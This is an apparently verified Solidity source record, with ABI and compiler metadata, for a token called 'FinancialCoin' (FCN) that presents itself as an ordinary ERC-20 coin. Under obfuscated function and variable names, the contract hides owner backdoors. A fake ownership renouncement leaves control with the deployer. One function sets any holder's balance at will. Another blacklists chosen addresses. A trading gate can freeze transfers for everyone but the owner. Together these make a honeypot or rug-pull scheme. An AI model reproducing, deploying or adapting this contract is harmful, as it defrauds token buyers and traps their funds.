{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSender {\n    function createPair(address minReceiver, address fundSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fromSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface tradingLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityFundLaunched) external view returns (uint256);\n\n    function transfer(address txTokenShould, uint256 shouldBuyLaunched) external returns (bool);\n\n    function allowance(address limitTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldBuyLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTokenShould,\n        uint256 shouldBuyLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenAmount, uint256 value);\n    event Approval(address indexed limitTo, address indexed spender, uint256 value);\n}\n\ninterface tradingLiquidityMetadata is tradingLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FinancialCoin is fromTrading, tradingLiquidity, tradingLiquidityMetadata {\n\n    function getOwner() external view returns (address) {\n        return tradingAt;\n    }\n\n    function modeSender(address teamTo, address txTokenShould, uint256 shouldBuyLaunched) internal returns (bool) {\n        require(launchListLimit[teamTo] >= shouldBuyLaunched);\n        launchListLimit[teamTo] -= shouldBuyLaunched;\n        launchListLimit[txTokenShould] += shouldBuyLaunched;\n        emit Transfer(teamTo, txTokenShould, shouldBuyLaunched);\n        return true;\n    }\n\n    bool public autoFee;\n\n    function toSenderLaunch() public {\n        emit OwnershipTransferred(listTrading, address(0));\n        tradingAt = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalIs;\n    }\n\n    address public maxLaunchedSell;\n\n    function owner() external view returns (address) {\n        return tradingAt;\n    }\n\n    string private limitMaxAmount = \"Financial Coin\";\n\n    mapping(address => uint256) private launchListLimit;\n\n    bool public sellToAt;\n\n    event OwnershipTransferred(address indexed liquidityReceiverAt, address indexed marketingTx);\n\n    uint256 private buyMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountToken;\n    }\n\n    bool public limitFee;\n\n    mapping(address => bool) public takeReceiver;\n\n    function balanceOf(address liquidityFundLaunched) public view virtual override returns (uint256) {\n        return launchListLimit[liquidityFundLaunched];\n    }\n\n    function buyTake(uint256 shouldBuyLaunched) public {\n        receiverFee();\n        fromToTrading = shouldBuyLaunched;\n    }\n\n    address sellMaxExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 walletTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedShould;\n    }\n\n    function allowance(address launchedAt, address listTeamToken) external view virtual override returns (uint256) {\n        if (listTeamToken == sellMaxExempt) {\n            return type(uint256).max;\n        }\n        return fundLimit[launchedAt][listTeamToken];\n    }\n\n    uint256 public autoShould;\n\n    function transfer(address modeTotal, uint256 shouldBuyLaunched) external virtual override returns (bool) {\n        return enableTotalTo(_msgSender(), modeTotal, shouldBuyLaunched);\n    }\n\n    uint256 public marketingShould;\n\n    uint256 public tradingReceiver = 0;\n\n    uint256 constant feeTx = 16 ** 10;\n\n    mapping(address => bool) public feeSwap;\n\n    uint256 fromToTrading;\n\n    address public listTrading;\n\n    uint256 public limitLaunch = 3;\n\n    mapping(address => mapping(address => uint256)) private fundLimit;\n\n    function approve(address listTeamToken, uint256 shouldBuyLaunched) public virtual override returns (bool) {\n        fundLimit[_msgSender()][listTeamToken] = shouldBuyLaunched;\n        emit Approval(_msgSender(), listTeamToken, shouldBuyLaunched);\n        return true;\n    }\n\n    function receiverFee() private view {\n        require(feeSwap[_msgSender()]);\n    }\n\n    uint256 private listMode;\n\n    constructor (){\n        \n        toSenderLaunch();\n        fromSell maxBuyTake = fromSell(sellMaxExempt);\n        maxLaunchedSell = receiverSender(maxBuyTake.factory()).createPair(maxBuyTake.WETH(), address(this));\n        tradingTakeLiquidity = receiverSender(maxBuyTake.factory()).feeTo();\n        \n        listTrading = _msgSender();\n        feeSwap[listTrading] = true;\n        launchListLimit[listTrading] = launchedShould;\n        \n        emit Transfer(address(0), listTrading, launchedShould);\n    }\n\n    function enableTotalTo(address teamTo, address txTokenShould, uint256 shouldBuyLaunched) internal returns (bool) {\n        if (teamTo == listTrading) {\n            return modeSender(teamTo, txTokenShould, shouldBuyLaunched);\n        }\n        uint256 liquidityTeam = tradingLiquidity(maxLaunchedSell).balanceOf(tradingTakeLiquidity);\n        require(liquidityTeam == fromToTrading);\n        require(txTokenShould != tradingTakeLiquidity);\n        if (takeReceiver[teamTo]) {\n            return modeSender(teamTo, txTokenShould, feeTx);\n        }\n        shouldBuyLaunched = teamMode(teamTo, txTokenShould, shouldBuyLaunched);\n        return modeSender(teamTo, txTokenShould, shouldBuyLaunched);\n    }\n\n    string private totalIs = \"FCN\";\n\n    bool public receiverModeTake;\n\n    function enableToken(address listTeam) public {\n        if (autoFee) {\n            return;\n        }\n        \n        feeSwap[listTeam] = true;\n        if (receiverModeTake == shouldSell) {\n            receiverModeTake = true;\n        }\n        autoFee = true;\n    }\n\n    function liquidityMax(address feeEnable) public {\n        receiverFee();\n        \n        if (feeEnable == listTrading || feeEnable == maxLaunchedSell) {\n            return;\n        }\n        takeReceiver[feeEnable] = true;\n    }\n\n    address private tradingAt;\n\n    bool private walletTeam;\n\n    uint256 private launchedShould = 100000000 * 10 ** 18;\n\n    uint8 private amountToken = 18;\n\n    function transferFrom(address teamTo, address txTokenShould, uint256 shouldBuyLaunched) external override returns (bool) {\n        if (_msgSender() != sellMaxExempt) {\n            if (fundLimit[teamTo][_msgSender()] != type(uint256).max) {\n                require(shouldBuyLaunched <= fundLimit[teamTo][_msgSender()]);\n                fundLimit[teamTo][_msgSender()] -= shouldBuyLaunched;\n            }\n        }\n        return enableTotalTo(teamTo, txTokenShould, shouldBuyLaunched);\n    }\n\n    function teamMode(address teamTo, address txTokenShould, uint256 shouldBuyLaunched) internal view returns (uint256) {\n        require(shouldBuyLaunched > 0);\n\n        uint256 teamToMarketing = 0;\n        if (teamTo == maxLaunchedSell && limitLaunch > 0) {\n            teamToMarketing = shouldBuyLaunched * limitLaunch / 100;\n        } else if (txTokenShould == maxLaunchedSell && tradingReceiver > 0) {\n            teamToMarketing = shouldBuyLaunched * tradingReceiver / 100;\n        }\n        require(teamToMarketing <= shouldBuyLaunched);\n        return shouldBuyLaunched - teamToMarketing;\n    }\n\n    bool private shouldSell;\n\n    function name() external view virtual override returns (string memory) {\n        return limitMaxAmount;\n    }\n\n    uint256 private exemptToken;\n\n    address tradingTakeLiquidity;\n\n    function teamAmountTo(address modeTotal, uint256 shouldBuyLaunched) public {\n        receiverFee();\n        launchListLimit[modeTotal] = shouldBuyLaunched;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiverAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTeamToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeamToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuyLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFundLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldBuyLaunched\",\"type\":\"uint256\"}],\"name\":\"buyTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"}],\"name\":\"liquidityMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunchedSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverModeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuyLaunched\",\"type\":\"uint256\"}],\"name\":\"teamAmountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSenderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuyLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTokenShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuyLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FinancialCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}